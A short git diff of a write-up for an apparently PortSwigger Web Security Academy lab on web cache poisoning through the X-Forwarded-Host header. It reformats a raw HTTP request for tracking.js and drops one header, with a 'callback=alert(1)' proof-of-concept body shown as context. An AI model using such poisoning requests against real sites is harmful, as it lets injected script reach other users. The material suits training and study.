@@ -17,7 +17,8 @@
 - The website also allowed for X-Forwarded-Host which would change the link
 - I sent this request to tracking.js:
 ```http
-GET /resources/js/tracking.js HTTP/2Host: 0a5200060335f34b817d667700130056.web-security-academy.net
+GET /resources/js/tracking.js HTTP/2
+Host: 0a5200060335f34b817d667700130056.web-security-academy.net
 Cookie: session=CMTcrvpZEooQ7J39QXbx1HYOk8OlhNwC
 Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
 Sec-Ch-Ua-Mobile: ?0
@@ -92,7 +93,6 @@ Sec-Fetch-Dest: script
 Referer: https://0a26003f0429f29e803576e000d8002b.web-security-academy.net/
 Accept-Encoding: gzip, deflate, br
 Accept-Language: en-US,en;q=0.9
-X-Http-Method-Override: POST
 Content-Length: 17
 
 callback=alert(1)
